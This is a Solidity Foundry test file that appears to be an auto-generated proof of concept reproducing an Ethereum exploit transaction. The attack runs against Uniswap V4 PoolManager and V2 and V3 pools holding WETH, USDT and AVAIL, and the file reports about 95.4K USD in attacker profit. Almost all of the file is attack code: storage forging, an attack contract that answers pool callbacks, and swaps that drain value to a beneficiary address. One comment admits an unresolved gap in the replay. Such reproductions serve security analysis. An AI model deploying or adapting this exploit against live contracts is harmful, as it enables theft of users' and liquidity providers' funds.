// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x00000000fd3a7b3fa5bcfa843c648714b11e089b
// Attack Contract : 0x00000000fd3a7b3fa5bcfa843c648714b11e089b
// Vulnerable Contract : 0x00000000fd3a7b3fa5bcfa843c648714b11e089b
// Attack Tx : 0xb1a43313b51512b45fc5d921838a8a6427266f4326e5d82cde7cdbe02daa3349
// Block : 25467373
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 95.4K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER;
    address constant ATTACK_CONTRACT = Addresses.ATTACKER;
    uint256 constant FORK_BLOCK = 25467372;
    uint256 constant TX_TIMESTAMP = 1783267151;
    uint256 constant TX_BLOCK_NUMBER = 25467373;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 58214;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
        _restoreArtifactPrestate();
    }

    function _restoreArtifactPrestate() internal {
        VmExt vmExt = _vmExt();
        vmExt.store(
            Addresses.PoolManager,
            bytes32(uint256(61058853160772228981251696887365571638019939768531186436060450793826060321880)),
            bytes32(uint256(0x0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3))
        );
        vmExt.store(
            Addresses.PoolManager,
            bytes32(uint256(61058853160772228981251696887365571638019939768531186436060450793826060321881)),
            bytes32(uint256(0x00000000000000000000000000000000000000001f0e01f4f6241bbdecdd25f4))
        );
        vmExt.store(
            Addresses.PoolManager,
            bytes32(uint256(61058853160772228981251696887365571638019939768531186436060450793826060321883)),
            bytes32(uint256(513027483134796))
        );
        vmExt.store(
            Addresses.PoolManager,
            bytes32(uint256(89987846012514813302382888718840577882388445722385023202052289640322649308294)),
            bytes32(uint256(1125899906842624))
        );
        vmExt.store(
            Addresses.UNI_V2,
            bytes32(uint256(10)),
            bytes32(uint256(0x0000000000000000000001e53fcb65279c3593a6cb96244abfdebb72532b7faf))
        );
        vmExt.store(Addresses.UNI_V2, bytes32(uint256(12)), bytes32(uint256(1)));
        vmExt.store(
            Addresses.UNI_V2, bytes32(uint256(6)), bytes32(uint256(1097077688018008265106216665536940668749033598146))
        );
        vmExt.store(
            Addresses.UNI_V2, bytes32(uint256(7)), bytes32(uint256(1248875146012964071876423320777688075155124985543))
        );
        vmExt.store(
            Addresses.UNI_V2,
            bytes32(uint256(8)),
            bytes32(uint256(0x6a4a7bcb00000000000000000682f6028e130000000000dac17177d60c66f9ed))
        );
        vmExt.store(
            Addresses.UNI_V2,
            bytes32(uint256(9)),
            bytes32(uint256(0x000000000000000000000000000000000000715337b705e30cf26b5e2cbfade8))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(0)),
            bytes32(uint256(0x000166000100010000ff056200000000000000000a5acc42ff4934533d234a7a))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(2)),
            bytes32(uint256(0x000000000000000000000000000000b3f4782730b06cad7a565d31c3108c6347))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(28212876883947467128917703474378516019173305230661588919942657668795042982449)),
            bytes32(uint256(911192290775061569109731927171756789354229147547675231936572536389632000))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(3)),
            bytes32(uint256(0x000000000000022f2f279060c880e4c6000000000000000019d540122f5ee700))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(38357942052654430511805280289652572966474101887281969759642760585367641502968)),
            bytes32(uint256(0))
        );
        vmExt.store(Addresses.A_80F814_DDB2, bytes32(uint256(4)), bytes32(uint256(43414707828214958623)));
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(44822242127784473863779503940359437093599026256872792845248089020055034419342)),
            bytes32(uint256(0))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(70568694660641182846837952053976312584632871543539053970448735909214556581883)),
            bytes32(uint256(9444737469338917797888))
        );
        vmExt.store(
            Addresses.A_80F814_DDB2,
            bytes32(uint256(8)),
            bytes32(uint256(452315182724898930274845687898684990087897235389631868398387512480316948303))
        );
        vmExt.store(
            Addresses.WETH,
            bytes32(uint256(106481592555977542721063748933174392679778010396301407270990558048416916744131)),
            bytes32(uint256(0x00000000000000000000000000000000000000000000003cae6a98c5166f55c8))
        );
        vmExt.store(
            Addresses.WETH,
            bytes32(uint256(11839838417408005300668405460519842744078024714876931848523103724423050260794)),
            bytes32(uint256(864026955566638673825))
        );
        vmExt.store(
            Addresses.WETH,
            bytes32(uint256(48115348730228749977999540563523801288035852106327104547173401750282426579973)),
            bytes32(uint256(0x0000000000000000000000000000000000000000000000000000000000000002))
        );
        vmExt.store(
            Addresses.WETH,
            bytes32(uint256(78217340955224583260704322316367930911365736621628114621345929384933888615440)),
            bytes32(uint256(0x0000000000000000000000000000000000000000000000dac17177d60c66f9ed))
        );
        vmExt.store(
            Addresses.USDT, bytes32(uint256(0)), bytes32(uint256(1134972014892877928712953364190483482895670224936))
        );
        vmExt.store(Addresses.USDT, bytes32(uint256(10)), bytes32(uint256(0)));
        vmExt.store(Addresses.USDT, bytes32(uint256(3)), bytes32(uint256(0)));
        vmExt.store(
            Addresses.USDT,
            bytes32(uint256(31522459708058459104559660377019520587686043844720181043684373841271582389402)),
            bytes32(uint256(0x00000000000000000000000000000000000000000000000000000682f6028e13))
        );
        vmExt.store(Addresses.USDT, bytes32(uint256(4)), bytes32(uint256(0)));
        vmExt.store(
            Addresses.USDT,
            bytes32(uint256(56307990453454577183170456439140225917386588092972445974423727997250691112274)),
            bytes32(uint256(0))
        );
        vmExt.store(
            Addresses.USDT,
            bytes32(uint256(58503166935794899529373963234700026353561458556759469400570547766664673378107)),
            bytes32(uint256(0x0000000000000000000000000000000000000000000000000000507c458ba126))
        );
        vmExt.store(
            Addresses.AVAIL,
            bytes32(uint256(671675399397558102957552203897876276509278528816509677911571250365142770739)),
            bytes32(uint256(0x000000000000000000000000000000000000000000000f29d405a053a7e1dd9c))
        );
        vmExt.store(
            Addresses.AVAIL,
            bytes32(uint256(8136575324183574597632360007192724009670472768554514514227133597830207362644)),
            bytes32(uint256(0x0000000000000000000000000000000000000000000000d31b18d0f763575687))
        );
    }

    function _vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x00000002));
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ATTACKER, ATTACKER_EOA, Addresses.ZERO, "ETH", 53817904194517777076);
        _expectProfit(Addresses.ATTACKER, attack, Addresses.WETH, "WETH", 1);
        _expectProfit(Addresses.A_4838B1_5F97, address(0), Addresses.ZERO, "ETH", 1018251889772367587301);
    }
}

contract OurAttack {
    bytes32 private constant UNISWAP_V3_CALLBACK = keccak256("poc.callback.uniswapV3SwapCallback");

    mapping(bytes32 => bool) private _callbackDone;
    mapping(bytes4 => uint256) private _dispatchCursor;

    function attack() public payable {
        _readPoolState();
    }

    function _sendAvailToV3() internal {
        IERC20Like(Addresses.AVAIL).transfer(Addresses.A_80F814_DDB2, 2154172018403229647873);
    }

    function _sendWethToV2() internal {
        IERC20Like(Addresses.WETH).transfer(Addresses.UNI_V2, 394222242740549679);
    }

    function _readPoolUsdtBalance() internal view {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _readPoolWethBalance() internal view {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function _enterUnlockCallback() internal {
        _decodedCall(Addresses.ATTACKER, abi.encodeWithSignature("unlockCallback(bytes)", hex""));
    }

    function _readPoolState() internal {
        IUNI_V2(Addresses.UNI_V2).getReserves();
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "extsload(bytes32)", bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458")
            )
        );
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "extsload(bytes32)", bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b")
            )
        );
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).slot0();
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).liquidity();
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "extsload(bytes32)", bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86")
            )
        );
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(-2));
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(-1));
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(0));
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2).tickBitmap(int16(1));
        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("unlock(bytes)", hex""));
        uint256 withdrawAmount = 1072069817672276512865;
        IWETH(Addresses.WETH).withdraw(withdrawAmount);
        (bool paidBeneficiary,) = payable(Addresses.A_4838B1_5F97).call{value: 1018251889772367587301}("");
        require(paidBeneficiary, "beneficiary payment failed");
    }

    function _unlockCallback() internal {
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "take(address,address,uint256)", Addresses.WETH, Addresses.UNI_V2, 394222242740549679
            )
        );
        IUNI_V2(Addresses.UNI_V2).getReserves();
        IERC20Like(Addresses.WETH).balanceOf(Addresses.UNI_V2);
        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("sync(address)", Addresses.USDT));
        IUniswapV2PairLike(Addresses.UNI_V2).swap(0, 697268911, Addresses.PoolManager, hex"");
        _decodedCall(Addresses.PoolManager, abi.encodeWithSelector(bytes4(0x11da60b4)));
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "exttload(bytes32)", bytes32(hex"61ac5916fc3db3aaeeba1f9391995dd4c05363adf447cc28b2e334e6f21f8e99")
            )
        );
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "swap((address,address,uint24,int24,address),(bool,int256,uint160),bytes)",
                Abi_swap_Param0({
                    field0: Addresses.USDT,
                    field1: Addresses.AVAIL,
                    field2: 880000,
                    field3: 17600,
                    field4: Addresses.ZERO
                }),
                Abi_swap_Param1({field0: true, field1: -697268911, field2: 4295128740}),
                hex""
            )
        );
        IContract_80F814_DDB2(Addresses.A_80F814_DDB2)
            .swap(
                address(this),
                false,
                int256(2154172018403229647873),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                hex""
            );
        _decodedCall(Addresses.PoolManager, abi.encodeWithSignature("sync(address)", Addresses.WETH));
        uint256 wethTransferAmount = 394222242740549679;
        IERC20Like(Addresses.WETH).transfer(Addresses.PoolManager, wethTransferAmount);
        _decodedCall(Addresses.PoolManager, abi.encodeWithSelector(bytes4(0x11da60b4)));
    }

    function _uniswapV3Callback() internal {
        _callbackDone[UNISWAP_V3_CALLBACK] = true;
        _decodedCall(
            Addresses.PoolManager,
            abi.encodeWithSignature(
                "take(address,address,uint256)", Addresses.AVAIL, Addresses.A_80F814_DDB2, 2154172018403229647873
            )
        );
    }

    receive() external payable {}

    function take(address arg0, address arg1, uint256 amount) external payable {
        arg0;
        arg1;
        amount;
        uint256 dispatchArg0Call2;
        assembly { dispatchArg0Call2 := calldataload(4) }
        if (address(uint160(dispatchArg0Call2)) == 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) {
            _sendWethToV2();
            return;
        }
        uint256 dispatchArg0Call;
        assembly { dispatchArg0Call := calldataload(4) }
        if (address(uint160(dispatchArg0Call)) == 0xEeB4d8400AEefafC1B2953e0094134A887C76Bd8) {
            _sendAvailToV3();
            return;
        }
        _sendWethToV2();
        return;
    }

    function settle() external payable {
        uint256 dispatchOrdinal = _nextDispatch(0x11da60b4);
        if (dispatchOrdinal == 0) {
            _readPoolUsdtBalance();
            bytes memory usdtSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
            assembly { return(add(usdtSettleReturn, 32), mload(usdtSettleReturn)) }
        }
        if (dispatchOrdinal == 1) {
            _readPoolWethBalance();
            bytes memory wethSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
            assembly { return(add(wethSettleReturn, 32), mload(wethSettleReturn)) }
        }
        _readPoolUsdtBalance();
        bytes memory fallbackSettleReturn = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
        assembly { return(add(fallbackSettleReturn, 32), mload(fallbackSettleReturn)) }
    }

    function extsload(bytes32 arg0) external payable {
        arg0;
        uint256 dispatchArg0Call5;
        assembly { dispatchArg0Call5 := calldataload(4) }
        if (
            bytes32(dispatchArg0Call5) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c458")
        ) {
            bytes memory pairSlotReturn = hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3";
            assembly { return(add(pairSlotReturn, 32), mload(pairSlotReturn)) }
        }
        uint256 dispatchArg0Call7;
        assembly { dispatchArg0Call7 := calldataload(4) }
        if (
            bytes32(dispatchArg0Call7) == bytes32(hex"86fe1610fa83344fbd233016e8d0deaca5e02c56a81bafdd3464ee4d4333c45b")
        ) {
            bytes memory liquiditySlotReturn = hex"0000000000000000000000000000000000000000000000000001d29884e46b4c";
            assembly { return(add(liquiditySlotReturn, 32), mload(liquiditySlotReturn)) }
        }
        uint256 dispatchArg0Call6;
        assembly { dispatchArg0Call6 := calldataload(4) }
        if (
            bytes32(dispatchArg0Call6) == bytes32(hex"c6f350df2ad5ce5ee5f86d234216d12580e7a518a990d42dfadbbe3349b43c86")
        ) {
            bytes memory bitmapSlotReturn = hex"0000000000000000000000000000000000000000000000000004000000000000";
            assembly { return(add(bitmapSlotReturn, 32), mload(bitmapSlotReturn)) }
        }
        bytes memory defaultSlotReturn = hex"0000000d6d8000000004d5c0000000000073d300c5f7bf1eac918e5c98a916a3";
        assembly { return(add(defaultSlotReturn, 32), mload(defaultSlotReturn)) }
    }

    function unlock(bytes calldata arg0) external payable {
        arg0;
        _enterUnlockCallback();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function unlockCallback(bytes calldata arg0) external payable {
        arg0;
        _unlockCallback();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function sync(address arg0) external payable {
        arg0;
        uint256 dispatchArg0Call10;
        assembly { dispatchArg0Call10 := calldataload(4) }
        if (address(uint160(dispatchArg0Call10)) == 0xdAC17F958D2ee523a2206206994597C13D831ec7) {
            _readPoolUsdtBalance();
            return;
        }
        uint256 dispatchArg0Call9;
        assembly { dispatchArg0Call9 := calldataload(4) }
        if (address(uint160(dispatchArg0Call9)) == 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) {
            _readPoolWethBalance();
            return;
        }
        _readPoolUsdtBalance();
        return;
    }

    function exttload(bytes32 arg0) external payable {
        arg0;
        bytes memory ret = hex"00000000000000000000000000000000000000000000000000000000298f7aaf";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function swap(Abi_swap_Param0 calldata amount, Abi_swap_Param1 calldata amount1, bytes calldata amount2)
        external
        payable
    {
        amount;
        amount1;
        amount2;
        // UNRESOLVED_GAP: PoolManager swap frame has storage-only observations in action_0023..action_0028.
        // No normal trace-backed call is available in the handoff, so the PoC preserves the observed return only.
        bytes memory ret = hex"ffffffffffffffffffffffffd67085510000000000000074c7246571fabd4401";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external payable {
        amount0Delta;
        amount1Delta;
        data;
        if (!_callbackDone[UNISWAP_V3_CALLBACK]) _uniswapV3Callback();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x00000002) {
            attack();
            return;
        }
    }

    function _nextDispatch(bytes4 sigHash) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[sigHash];
        _dispatchCursor[sigHash] = ordinal + 1;
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child dispatch failed");
    }
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant ATTACKER = 0x00000000fd3A7B3Fa5bCfA843C648714b11E089B;
    address internal constant UNI_V2 = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address internal constant A_15BFAA_5389 = 0x15BfaA874261055be85fC5DB534f4520A0715389;
    address internal constant A_15F7E7_FFFF = 0x15f7e7B9C1C1ad7efFFFFFfFFFFFFFFFFfffffFF;
    address internal constant A_15F7E7_0000 = 0x15f7E7B9c1c1Ad7F000000000000000000000000;
    address internal constant A_15F7E8_5EE8 = 0x15f7E808b26c348984cADa4f98F799b1Ace75EE8;
    address internal constant A_185EB2_C8C6 = 0x185Eb2018f7974a114F5A3e282424c895231c8C6;
    address internal constant A_238A35_E6C4 = 0x238a358808379702088667322f80aC48bAd5e6c4;
    address internal constant A_2492BD_0000 = 0x2492bDe200000000000000000000000000000000;
    address internal constant A_2E1E5C_1C4F = 0x2e1e5c88D1da79FCFd5569BDd59191a9f2a31C4F;
    address internal constant A_2E9467_0000 = 0x2e9467BB6Cb60d12000000000000000000000000;
    address internal constant A_4838B1_5F97 = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    address internal constant A_80F814_DDB2 = 0x80F8143Fa056A063AaEeCec3323Aa3426262ddb2;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant AVAIL = 0xEeB4d8400AEefafC1B2953e0094134A887C76Bd8;
    address internal constant A_FFFD89_1682 = 0xFFFD8963efd1FC6a506488495d951D5163961682;
    address internal constant A_FFFD89_8D25 = 0xfFfd8963EFd1fC6A506488495d951d5263988d25;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct Abi_swap_Param0 {
    address field0;
    address field1;
    uint24 field2;
    int24 field3;
    address field4;
}

struct Abi_swap_Param1 {
    bool field0;
    int256 field1;
    uint160 field2;
}

interface IContract_80F814_DDB2 {
    function liquidity() external view returns (uint256);
    function slot0() external view;
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function tickBitmap(int16) external view returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPoolManager {
    function extsload(bytes32) external view returns (uint256);
    function exttload(bytes32) external view returns (uint256);
    function settle() external returns (uint256);
    function swap(Abi_swap_Param0 calldata, Abi_swap_Param1 calldata, bytes calldata) external returns (uint256);
    function sync(address) external;
    function take(address, address, uint256) external;
    function unlock(bytes calldata) external;
}

interface IUNI_V2 {
    function getReserves() external view;
}

interface IWETH {
    function withdraw(uint256) external;
}
